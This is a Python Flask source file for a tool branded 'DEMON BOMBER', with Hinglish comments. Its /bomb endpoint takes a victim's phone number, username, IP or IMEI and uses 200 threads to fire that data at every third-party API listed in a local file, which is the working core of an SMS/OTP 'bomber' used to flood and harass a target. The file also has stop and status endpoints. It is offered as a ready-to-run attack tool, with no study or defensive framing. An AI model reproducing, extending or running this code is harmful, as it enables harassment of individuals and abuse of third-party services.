from flask import Flask, request, jsonify
import requests
import threading
import time
from concurrent.futures import ThreadPoolExecutor

app = Flask(__name__)

# ==========================================
# GLOBAL VARIABLES
# ==========================================
API_LIST = []
attack_threads = {}
is_attacking = False
stop_flag = False

# ==========================================
# TERI FILE SE SAB API DIRECT LOAD
# ==========================================
def load_apis_from_file():
    apis = []
    try:
        with open("working_api_y5ocxu.txt", "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#") and (line.startswith("http://") or line.startswith("https://")):
                    apis.append(line)
        print(f"✅ {len(apis)} APIs LOADED FROM YOUR FILE")
    except:
        print("❌ FILE NOT FOUND! (working_api_y5ocxu.txt)")
        apis = []
    return apis

API_LIST = load_apis_from_file()

# ==========================================
# REPLACE VARIABLES
# ==========================================
def replace_vars(url, params):
    for key, val in params.items():
        url = url.replace("{" + key + "}", str(val))
        url = url.replace("{" + key.upper() + "}", str(val))
    return url

def fire_request(url, params):
    global stop_flag
    if stop_flag:
        return
    try:
        final_url = replace_vars(url, params) if params else url
        if "POST" in url.upper():
            requests.post(final_url, json=params, timeout=2)
        else:
            requests.get(final_url, timeout=2)
    except:
        pass

# ==========================================
# BOMB ENDPOINT
# ==========================================
@app.route("/bomb", methods=["GET", "POST"])
def bomb():
    global is_attacking, stop_flag
    
    if request.method == "GET":
        params = request.args.to_dict()
    else:
        params = request.json or {}

    if not params:
        return jsonify({
            "error": "❌ KOI PARAM BHEJO!",
            "example": "/bomb?phone=9876543210&username=john&ip=1.1.1.1&imei=123456"
        }), 400

    stop_flag = False
    is_attacking = True
    fired_count = 0
    
    with ThreadPoolExecutor(max_workers=200) as executor:
        for api in API_LIST:
            if stop_flag:
                break
            if any(key in api or "{" in api for key in params.keys()):
                executor.submit(fire_request, api, params)
                fired_count += 1
    
    is_attacking = False
    return jsonify({
        "status": "🔥 BOMB DROPPED!",
        "total_apis_in_file": len(API_LIST),
        "apis_triggered": fired_count,
        "target_params": params
    })

# ==========================================
# STOP ENDPOINT - TERI BAAP NE ADD KIA
# ==========================================
@app.route("/stop", methods=["GET", "POST"])
def stop_attack():
    global stop_flag, is_attacking
    stop_flag = True
    is_attacking = False
    return jsonify({
        "status": "🛑 ATTACK STOPPED!",
        "message": "DEMON 😈 ne attack rok diya!",
        "apis_stopped": len(API_LIST)
    })

# ==========================================
# STATUS CHECK
# ==========================================
@app.route("/status")
def status():
    return jsonify({
        "status": "ACTIVE" if is_attacking else "IDLE",
        "total_apis": len(API_LIST),
        "stop_flag": stop_flag,
        "apis_loaded": len(API_LIST) > 0
    })

# ==========================================
# HOME
# ==========================================
@app.route("/")
def home():
    return f"""
    <h1>🔥 DEMON BOMBER ACTIVE</h1>
    <h3>📁 APIs Loaded from your file: {len(API_LIST)}</h3>
    <p>🚀 START: /bomb?phone=9876543210</p>
    <p>🛑 STOP: /stop</p>
    <p>📊 STATUS: /status</p>
    """

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
